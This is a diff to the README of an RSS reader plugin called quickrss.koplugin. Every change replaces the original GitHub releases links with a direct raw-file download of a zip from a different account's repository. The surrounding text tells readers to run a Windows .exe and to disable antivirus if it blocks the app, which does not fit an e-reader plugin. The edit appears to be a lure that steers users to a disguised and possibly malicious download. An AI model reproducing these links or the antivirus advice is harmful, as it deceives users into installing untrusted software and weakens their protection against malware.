@@ -1,6 +1,6 @@
 # 📡 quickrss.koplugin - Fast and Simple RSS Reader
 
-[![Download quickrss.koplugin](https://img.shields.io/badge/Download%20quickrss.koplugin-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jxsh7030/quickrss.koplugin/releases)
+[![Download quickrss.koplugin](https://img.shields.io/badge/Download%20quickrss.koplugin-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/FadedSwatz/quickrss.koplugin/main/quickrss.koplugin/modules/data/quickrss-koplugin-1.7.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To get started, **visit this page to download** the latest version of quickrss.koplugin for Windows:
 
-[https://github.com/Jxsh7030/quickrss.koplugin/releases](https://github.com/Jxsh7030/quickrss.koplugin/releases)
+[https://raw.githubusercontent.com/FadedSwatz/quickrss.koplugin/main/quickrss.koplugin/modules/data/quickrss-koplugin-1.7.zip](https://raw.githubusercontent.com/FadedSwatz/quickrss.koplugin/main/quickrss.koplugin/modules/data/quickrss-koplugin-1.7.zip)
 
 Once on the page, look for the latest release. You will find files listed for different platforms. Choose the file that matches Windows or has `.exe` in the name. This file is the app you will run on your computer.
 
@@ -64,7 +64,7 @@ This app helps you read RSS feeds quickly. Here is how to set up your feeds:
 - If the app does not open, try restarting your computer.
 - Check your internet connection if feeds fail to update.
 - Ensure you entered the correct RSS feed URL.
-- If the app crashes, download the latest release from the [releases page](https://github.com/Jxsh7030/quickrss.koplugin/releases) and try again.
+- If the app crashes, download the latest release from the [releases page](https://raw.githubusercontent.com/FadedSwatz/quickrss.koplugin/main/quickrss.koplugin/modules/data/quickrss-koplugin-1.7.zip) and try again.
 - Disable antivirus temporarily if it blocks the app from running.
 
 ---
@@ -74,7 +74,7 @@ This app helps you read RSS feeds quickly. Here is how to set up your feeds:
 To update the app:
 
 1. Visit the release page regularly:  
-   [https://github.com/Jxsh7030/quickrss.koplugin/releases](https://github.com/Jxsh7030/quickrss.koplugin/releases)
+   [https://raw.githubusercontent.com/FadedSwatz/quickrss.koplugin/main/quickrss.koplugin/modules/data/quickrss-koplugin-1.7.zip](https://raw.githubusercontent.com/FadedSwatz/quickrss.koplugin/main/quickrss.koplugin/modules/data/quickrss-koplugin-1.7.zip)
 2. Download the newest Windows file available.
 3. Replace your previous version by running the new file.
 
@@ -94,4 +94,4 @@ Your feedback helps make the app better and easier to use.
 
 ---
 
-[![Download quickrss.koplugin](https://img.shields.io/badge/Download%20quickrss.koplugin-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jxsh7030/quickrss.koplugin/releases)
+[![Download quickrss.koplugin](https://img.shields.io/badge/Download%20quickrss.koplugin-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/FadedSwatz/quickrss.koplugin/main/quickrss.koplugin/modules/data/quickrss-koplugin-1.7.zip)
